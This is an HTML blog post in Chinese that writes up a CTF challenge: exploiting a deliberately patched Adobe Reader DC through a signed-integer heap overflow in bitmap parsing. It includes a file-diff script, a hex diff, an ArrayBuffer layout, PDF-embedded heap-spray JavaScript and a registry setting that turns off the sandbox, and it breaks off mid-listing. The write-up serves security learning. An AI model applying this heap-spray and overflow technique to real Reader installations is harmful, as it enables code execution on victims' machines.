@@ -1,0 +1,544 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 7.3.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/ha1vk/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/ha1vk/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/ha1vk/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/ha1vk/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/ha1vk/css/main.css">
+
+
+<link rel="stylesheet" href="/ha1vk/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"github.com","root":"/ha1vk/","scheme":"Muse","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.json"};
+  </script>
+
+  <meta name="description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222391 0x00 前言第一次来强网杯线下，接触了realword题，收获很大，深有感触题目信息：**题目名称：**ADoBe**旗帜名称：**ADB**题目描述：**附件中给出了一个Adobe Reader DC可执行程序，请挖掘并利用该程序中的漏洞，在靶机中弹出计算器程序。靶机环境：Win10 虚拟机，">
+<meta property="og:type" content="article">
+<meta property="og:title" content="强网杯2020决赛RealWord题ADoBe(ADB)">
+<meta property="og:url" content="https://github.com/ha1vk/2020/11/16/qwb2020-final-adobe/index.html">
+<meta property="og:site_name" content="ha1vk&#39;s blog">
+<meta property="og:description" content="文章首发于安全KER https:&#x2F;&#x2F;www.anquanke.com&#x2F;post&#x2F;id&#x2F;222391 0x00 前言第一次来强网杯线下，接触了realword题，收获很大，深有感触题目信息：**题目名称：**ADoBe**旗帜名称：**ADB**题目描述：**附件中给出了一个Adobe Reader DC可执行程序，请挖掘并利用该程序中的漏洞，在靶机中弹出计算器程序。靶机环境：Win10 虚拟机，">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t016baaf7dab228236d.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t019eca1a3b6860a359.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01e632f768d5101d2d.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t011205661b71b7f054.png">
+<meta property="og:image" content="https://p0.ssl.qhimg.com/t0130b808993e1892bb.png">
+<meta property="og:image" content="https://p2.ssl.qhimg.com/t0162f175c84f9d2973.png">
+<meta property="og:image" content="https://p3.ssl.qhimg.com/t011f60bcb8f5f89d29.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t012b532259a5d8beda.png">
+<meta property="og:image" content="https://p1.ssl.qhimg.com/t01c19e4a3df315f052.png">
+<meta property="og:image" content="https://p5.ssl.qhimg.com/t01dd24c937ba1ffafd.png">
+<meta property="article:published_time" content="2020-11-16T07:30:25.000Z">
+<meta property="article:modified_time" content="2025-06-26T09:44:52.971Z">
+<meta property="article:author" content="ha1vk">
+<meta property="article:tag" content="JS引擎漏洞">
+<meta property="article:tag" content="堆溢出">
+<meta property="article:tag" content="windows漏洞利用">
+<meta property="article:tag" content="heap spray">
+<meta property="article:tag" content="Adobe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://p5.ssl.qhimg.com/t016baaf7dab228236d.png">
+
+<link rel="canonical" href="https://github.com/ha1vk/2020/11/16/qwb2020-final-adobe/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>强网杯2020决赛RealWord题ADoBe(ADB) | ha1vk's blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/ha1vk/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">ha1vk's blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/ha1vk/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/ha1vk/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/ha1vk/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/ha1vk/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/ha1vk/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="https://github.com/ha1vk/2020/11/16/qwb2020-final-adobe/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/ha1vk/images/avatar.gif">
+      <meta itemprop="name" content="ha1vk">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ha1vk's blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          强网杯2020决赛RealWord题ADoBe(ADB)
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-11-16 15:30:25" itemprop="dateCreated datePublished" datetime="2020-11-16T15:30:25+08:00">2020-11-16</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2025-06-26 17:44:52" itemprop="dateModified" datetime="2025-06-26T17:44:52+08:00">2025-06-26</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+                </span>
+                  ，
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/ha1vk/categories/%E5%AE%89%E5%85%A8%E7%A0%94%E7%A9%B6/" itemprop="url" rel="index"><span itemprop="name">安全研究</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>文章首发于安全KER <a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/222391">https://www.anquanke.com/post/id/222391</a></p>
+<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>第一次来强网杯线下，接触了realword题，收获很大，深有感触<br><strong>题目信息：</strong><br>**题目名称：**ADoBe<br>**旗帜名称：**ADB<br>**题目描述：**附件中给出了一个Adobe Reader DC可执行程序，请挖掘并利用该程序中的漏洞，在靶机中弹出计算器程序。<br>靶机环境：Win10 虚拟机，默认安装配置，系统补丁安装至最新。系统安装了附件中提供中的Adobe Reader DC程序，并已关闭程序沙箱。<br>**附件信息：**Adobe Reader DC程序及相关Dll文件，版本均与靶机中的一致。<br>展示环境拓扑：交换机连接选手攻击机和展示机，展示机使用VMware（最新版）运行靶机，靶机通过NAT方式连接到网络。<br>展示过程：选手携带自己的攻击机上台展示题解，攻击机需运行HTTP服务，供操作员下载能够利用程序漏洞的PDF文档。操作员打开PDF文档后，在规定的时间内，在靶机中弹出计算器程序判定为题解正确。<br><strong>注意事项：</strong><br>（1）在解题时，可通过在注册表项<br>HKLM\SOFTWARE\Wow6432Node\Policies\Adobe\Acrobat Reader\DC\FeatureLockDown中修改键值项bProtectedMode（DWORD类型），赋值为0来关闭Adobe Reader DC程序的沙箱；<br>（2）上台展示题解的时候注意关闭exp的调试信息。</p>
+<h2 id="0x01-挖掘过程"><a href="#0x01-挖掘过程" class="headerlink" title="0x01 挖掘过程"></a>0x01 挖掘过程</h2><p>从题目描述可以看出，这是要让我们对这个patch过的adobe reader软件进行漏洞挖掘，为了找出漏洞点，我们需要下载与当前版本一致的官方版本进行对比。<br><img src="https://p5.ssl.qhimg.com/t016baaf7dab228236d.png"><br>将官方版本下载安装后，我们写一个脚本来查找到底是哪一个文件被patch过，脚本如下，就是简单的内容比对。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">src_dir = <span class="string">u&#x27;C:\\Users\\Administrator\\Desktop\\realword\\Adobe附件\\Adobe\\Acrobat Reader DC&#x27;</span> <span class="comment"># 源文件目录地址</span></span><br><span class="line"></span><br><span class="line">comp_dest = <span class="string">u&#x27;C:\\Program Files (x86)\\Adobe\Acrobat Reader DC&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_all_files</span>(<span class="params">rootdir</span>):</span><br><span class="line">_files = []</span><br><span class="line"></span><br><span class="line"><span class="comment">#列出文件夹下所有的目录与文件</span></span><br><span class="line">list_file = os.listdir(rootdir)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(list_file)):</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构造路径</span></span><br><span class="line">path = os.path.join(rootdir,list_file[i])</span><br><span class="line"></span><br><span class="line"><span class="comment"># 判断路径是否是一个文件目录或者文件</span></span><br><span class="line"><span class="comment"># 如果是文件目录，继续递归</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">_files.extend(list_all_files(path))</span><br><span class="line"><span class="keyword">if</span> os.path.isfile(path):</span><br><span class="line">_files.append(path)</span><br><span class="line"><span class="keyword">return</span> _files</span><br><span class="line"></span><br><span class="line">files = list_all_files(src_dir)</span><br><span class="line"><span class="keyword">for</span> path <span class="keyword">in</span> files:</span><br><span class="line">path2 = comp_dest + <span class="string">&#x27;\\&#x27;</span> + path[<span class="built_in">len</span>(src_dir)+<span class="number">1</span>:]</span><br><span class="line"><span class="comment">#print path2</span></span><br><span class="line">f = <span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">content1 = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">f = <span class="built_in">open</span>(path2,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">content2 = f.read()</span><br><span class="line">f.close()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">continue</span></span><br><span class="line"><span class="keyword">if</span> content1 != content2:</span><br><span class="line"><span class="built_in">print</span> path</span><br></pre></td></tr></table></figure>
+<p>经过比对，发现仅一个文件被修改过，那就是Adobe\Acrobat Reader DC\Reader\plug_ins\AcroForm.api文件，接下来，利用Fairdell HexCmp2差异对比工具来对比AcroForm.api与官方文件的差异之处。结果如下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Different between:</span><br><span class="line">First file: &quot;C:\Users\Administrator\Desktop\AcroForm.api&quot;</span><br><span class="line">Second file: &quot;C:\Users\Administrator\Desktop\AcroForm_patched.api&quot;</span><br><span class="line">Shift: 0</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">First file: &quot;C:\Users\Administrator\Desktop\AcroForm.api&quot;</span><br><span class="line">Second file: &quot;C:\Users\Administrator\Desktop\AcroForm_patched.api&quot;</span><br><span class="line">Shift: 0</span><br><span class="line">Shift: 0</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line"></span><br><span class="line">000001E0 | 68 F0 E2 30 1E | 000001E0 | 00 00 00 00 00 |</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">0054B098 | 87 | 0054B098 | 8F |</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">0054B0C0 | EE | 0054B0C0 | FE |</span><br><span class="line">------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>
+<p>打开IDA分析，跳转到差异地址处，发现指令由<strong>无符号指令patch成了有符号指令</strong><br><img src="https://p1.ssl.qhimg.com/t019eca1a3b6860a359.png"><br>这题patch后的漏洞类型与腾讯安全玄武实验室分析CVE-2019-8014类似，甚至可以说，本题比CVE-2019-8014的利用更加简单方便，首先阅读腾讯实验室的文章，可以发现CVE-2019-8014的堆溢出写数据，不能做到很精准的控制，如果要向前溢出修改ArrayBuffer的byteLength时，那么从byteLength处到溢出堆的起始点都会被覆盖为同一个数据，也就是ArrayBuffer的DataView指针也会被覆盖，进程使用ArrayBuffer对象时会因为其DataView指针指向一个无效地址而崩溃，因此该利用需要事先在对应位置布置好fake DataView堆布局。</p>
+<h3 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h3><p>ArrayBuffer是JavaScript里的一种类，可以理解为是一个字节数组的包装类，如果要对ArrayBuufer的内存进行读写，就需要建立DataView对象来进行操作。在Adobe中，使用的JS引擎为SpiderMonkey，在早期的Adobe Reader中，其JS的版本不支持ArrayBuffer这个类，好在这是最新版的Adobe Reader，其ArrayBuffer类的大致结构如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ArrayBuffer</span> &#123;</span></span><br><span class="line"> public:</span><br><span class="line">  <span class="type">uint32_t</span> flags;               <span class="comment">// flags</span></span><br><span class="line">  <span class="type">uint32_t</span> byteLength;   <span class="comment">// 数组长度</span></span><br><span class="line">  <span class="type">uint32_t</span> dataview_obj;            <span class="comment">// dataview 对象指针</span></span><br><span class="line">  <span class="type">uint32_t</span> length;              <span class="comment">//</span></span><br><span class="line"> <span class="comment">// ...</span></span><br><span class="line"> <span class="comment">//数据区</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<h3 id="结合JS达到利用"><a href="#结合JS达到利用" class="headerlink" title="结合JS达到利用"></a>结合JS达到利用</h3><p>由于Adobe Reader本身支持JavaScript，我们希望利用堆溢出<strong>修改ArrayBuffer的byteLength为0xFFFFFFFF</strong>，从而使得该ArrayBuffer具有任意地址读写的能力，然后可以利用JavaScript对内存进行读写，劫持程序流；为了达到这个目的，首先我们得利用堆喷构造好堆布局如下<br><img src="https://p5.ssl.qhimg.com/t01e632f768d5101d2d.png"><br>我们希望在Adobe Reader解析bitmap之前时，ArrayBuffer对象后方能间隔的出现一些已经释放了的堆（“空洞”），这样解析bitmap时，存放bitmap的解压数据的堆(line)正好落到空洞里，然后通过bitmap解析时的堆溢出，向前方溢出，修改ArrayBuffer里的byteLength。</p>
+<h3 id="精准控制内存"><a href="#精准控制内存" class="headerlink" title="精准控制内存"></a>精准控制内存</h3><p>首先，xpos_是完全可以通过伪造bitmap，使得其值累加到0xFFFFFFFF，由于这里xpos_是有符号数，因此右移1位的操作，其符号位不变，仍然可以保持为负数，正是因为其符号能保持为负数，我们可以精准的向上方溢出。<br><img src="https://p2.ssl.qhimg.com/t011205661b71b7f054.png"><br>为了确定溢出的距离，我们使用动态调试，这里，我们选择堆喷的大小为0x140，因此，我们事先new ArrayBuffer(0x130)，然后间隔的释放一些ArrayBuffer对象。在Adobe Reader的pdf文档里，我们可以在xdp标签里嵌入</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;event activity=<span class="string">&quot;initialize&quot;</span> name=<span class="string">&quot;event__initialize&quot;</span>&gt;</span><br><span class="line">        <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">contentType</span>=<span class="string">&quot;application/x-javascript&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">        <span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">&lt;/event&gt;</span><br></pre></td></tr></table></figure>
+<p>该标签里的脚本会在Adobe Reader打开pdf文件开始时执行，也就是在解析bitmap之前执行，因此，我们可以在这里进行堆喷布局，pdf模板内xdp标签内的关键内容如下</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;variables&gt;</span><br><span class="line">      <span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">name</span>=<span class="string">&quot;spray&quot;</span> <span class="attr">contentType</span>=<span class="string">&quot;application/x-javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="comment">//全局变量</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> size = <span class="number">200</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">         <span class="keyword">var</span> array = <span class="keyword">new</span> <span class="title class_">Array</span>(size);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line">      &lt;?templateDesigner expand <span class="number">1</span>?&gt;</span><br><span class="line">   &lt;/variables&gt;</span><br><span class="line">   <span class="language-xml"><span class="tag">&lt;<span class="name">event</span> <span class="attr">activity</span>=<span class="string">&quot;initialize&quot;</span> <span class="attr">name</span>=<span class="string">&quot;event__initialize&quot;</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">     <span class="tag">&lt;<span class="name">script</span> <span class="attr">contentType</span>=<span class="string">&quot;application/x-javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="comment">// 在漏洞触发之前，我们布局好堆布局</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="keyword">function</span> <span class="title function_">fillHeap</span>(<span class="params"></span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">var</span> i;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   <span class="keyword">var</span> j;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            spray.<span class="property">array</span>[<span class="number">0</span>] = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">0x130</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   <span class="comment">//var dv = new DataView(spray.array[0]);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   <span class="comment">// dv.setUint32(0, 0x66666666, true);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   <span class="comment">//dv = null;</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            <span class="keyword">for</span> (i = <span class="number">0</span>; i &amp;lt; spray.<span class="property">array</span>.<span class="property">length</span>; ++i) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">               spray.<span class="property">array</span>[i] = spray.<span class="property">array</span>[<span class="number">0</span>].<span class="title function_">slice</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">	  <span class="comment">//spray.array[i] = new ArrayBuffer(0x130);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">//var dv = new DataView(spray.array[i]);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">      <span class="comment">//dv.setUint32(0,i, true);</span></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">            &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   <span class="keyword">for</span> (j = <span class="number">0</span>; j &amp;lt; <span class="number">0x1000</span>; j++) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">               <span class="keyword">for</span> (i = spray.<span class="property">size</span> - <span class="number">1</span>; i &amp;gt; spray.<span class="property">size</span> / <span class="number">4</span>; i -= <span class="number">10</span>) &#123;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">                  spray.<span class="property">array</span>[i] = <span class="literal">null</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">               &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">   &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        &#125;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        <span class="title function_">fillHeap</span>();</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">        app.<span class="title function_">alert</span>(<span class="string">&quot;[!] ready to go&quot;</span>);</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml">     </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml">   <span class="tag">&lt;/<span class="name">event</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+<p>堆布局配置好了，接着我们分析一下程序如何才能到达漏洞点进而溢出</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span 